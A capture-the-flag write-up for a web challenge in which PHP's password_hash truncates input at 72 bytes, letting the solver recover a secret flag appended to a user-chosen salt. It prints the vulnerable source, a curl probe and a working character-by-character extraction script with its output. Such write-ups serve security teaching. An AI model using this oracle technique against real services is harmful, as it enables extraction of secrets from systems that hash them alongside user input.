# Message

Category: Web

## Description

> Who remembers PHP? The password_hash() function is so convenient, no one can guess my password

A website was attached.

## Solution

The attached website allows us to peek at the PHP source:

```php
<html>
<body>

<h1>🧂 Tasty hashes! 🧂</h1>

<?php
  if (isset($_GET['debug'])) {
    show_source(__FILE__);
    exit();
  }

  $error = "";
  if (!isset($_GET['salt'])) {
    $error = "Salt is important for security! Please give me a salt.";
  }
  $salt = $_GET['salt'];
  if (strlen($salt) < 16) {
    $error = "This is too little salt! For tasty hashes we need more.";
  }

  if (!$error) {
    $flag = file_get_contents("/flag");  // Flag should look like CTF{[A-Z]+}
    $hash = password_hash($salt.$flag, PASSWORD_DEFAULT);
    echo '<p>Here you are! A tasty hash for you 😋 The flag is secure because hashes are irreversible. Even more so if they are salty!</p>';
    echo '<pre>'.$hash.'</pre>';
  } else {
    echo '<pre>'.$error.'</pre>';
  }
?>

<p>
  <a href='?debug=1'>Show source</a>
</p>
</body>
</html>
```

On first glance, this seems impossible. According to the manual page, `password_hash()` creates a new password hash using a 
strong one-way hashing algorithm, how can we leak the flag? However, PHP seems to be the present that keep on giving. 
Notice the following comment in the fine print:

> Caution: Using the `PASSWORD_BCRYPT` as the algorithm, will result in the password parameter being truncated to a maximum length of 72 bytes.

Very interesting. Let's check this by creating a salt of `71` characters:

```console
┌──(user@kali3)-[/media/sf_CTFs/google/Message]
└─$ curl https://msg-web.2024-bq.ctfcompetition.com/?salt=01234567890123456789012345678901234567890123456789012345678901234567890
<html>
<body>

<h1>🧂 Tasty hashes! 🧂</h1>

<p>Here you are! A tasty hash for you 😋 The flag is secure because hashes are irreversible. Even more so if they are salty!</p><pre>$2y$10$rS7MDowXzQKpD.60LnDumefYelE763lxz3zUmKskyBQN0SkHyXlDm</pre>
<p>
  <a href='?debug=1'>Show source</a>
</p>
</body>
</html>
```

If the comment is correct, the actual value passed to the hash algorithm will be our 71 characters, plus the first
character from the flag, which we can assume is `C` according to the flag format.
So, if we calculate the hash for `<our input>C`, we should get the same hash!

Using a test PHP script such as the following one, we can verify our assumption:

```php
<?php
$password = "01234567890123456789012345678901234567890123456789012345678901234567890D";
$hashed_password = "\$2y\$10\$WG6mnJGVj7UhsmQxayJ2w.GA9ZV86MLlPqiGAONnowJmoPXZRabOW";

if(password_verify($password, $hashed_password)) {
    echo "Good!";
} 
else {
    echo "Bad!";
}
?>
```

Running it, we get confirmation that only 72 characters are being used for the hash. So we 
can leak the flag character by character with a script such as:

```PHP
<?php

function extractPreContent($url) {
    $ch = curl_init();

    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);

    $response = curl_exec($ch);

    if ($response === false) {
        echo 'Error: ' . curl_error($ch) . PHP_EOL;
        curl_close($ch);
        return null;
    }

    curl_close($ch);

    if (preg_match('/<pre>(.*?)<\/pre>/s', $response, $matches)) {
        return $matches[1];
    }

    return null;
}

$flag = ""; // CTF{[A-Z]+}
$BASE_URL = 'https://msg-web.2024-bq.ctfcompetition.com/?salt=';
$MAX_BCRYPT = 72;
$ALPHABET = "ABCDEFGHIJKLMNOPQRSTUVWXYZ{}";

while (substr($flag, -1) != "}")
{
    $salt_len = $MAX_BCRYPT - strlen($flag) - 1;
    $salt = str_repeat("0", $salt_len);
    $content = extractPreContent($BASE_URL . $salt);
    
    for ($i = 0; $i < strlen($ALPHABET); $i++)
    {
        $arg = $salt . $flag . $ALPHABET[$i];
        if(password_verify($arg, $content)) {
            $flag .= $ALPHABET[$i];
            echo "$ALPHABET[$i]";
            break;
        }
    }
    if ($i == strlen($ALPHABET))
    {
        die ("Can't find flag");
    }
}
?>

```

Output:

```console
┌──(user@kali3)-[/media/sf_CTFs/google/Message]
└─$ php solve.php
CTF{SALTMAKESTHINGSTASTIERBUTLONGER}
```